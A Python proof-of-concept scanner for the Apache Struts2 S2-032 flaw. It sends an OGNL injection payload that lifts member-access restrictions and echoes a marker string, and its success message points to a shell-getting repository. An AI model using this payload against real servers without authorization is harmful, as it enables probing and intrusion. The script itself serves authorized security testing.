
#!/usr/bin/python3
#-*- coding:utf-8 -*-
"""
Struts2 S2-032 POC 检测脚本

漏洞描述:
Apache Struts2 的动态方法调用存在远程代码执行漏洞(S2-032)。
攻击者可以通过构造恶意的 OGNL 表达式来执行任意代码。

影响版本:
- Struts 2.3.20 - Struts 2.3.28(开启 DMI)
- Struts 2.3.29 - Struts 2.3.28.1(关闭 DMI)

检测原理:
通过发送包含 OGNL 表达式的 GET 请求,尝试执行代码并输出测试字符串。
如果服务器响应中包含测试字符串,则说明存在漏洞。

使用方法:
    python struts2_032_poc.py
    或在代码中调用 poc(url) 函数

参数说明:
    url: 目标URL,如 http://127.0.0.1:8080
    timeout: 请求超时时间(秒),默认10秒

返回值:
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意:
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
"""

import requests

TM = 10

def poc(url, timeout=10):
    """
    检测目标是否存在 Struts2 S2-032 漏洞
    
    Args:
        url: 目标URL,如 http://127.0.0.1:8080
        timeout: 请求超时时间(秒),默认10秒
    
    Returns:
        tuple: (是否存在漏洞, 结果消息)
    """
    poc='032'
    payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '', 'poc': poc}
    try:
        r = requests.get(url, params=payload, timeout=timeout)
    except Exception as e:
        print ("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False, f'Struts2 S2-032: 扫描失败 - {str(e)}'

    if poc in r.text:
        print("[+] Target "+url+" Find Struts2-032 Vuln!!! \n[+] GetShell:https://github.com/zhzyker/exphub/tree/master/struts2\n")
        return True, 'Struts2 S2-032: 存在漏洞'
    else:
        print("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False, 'Struts2 S2-032: 安全'


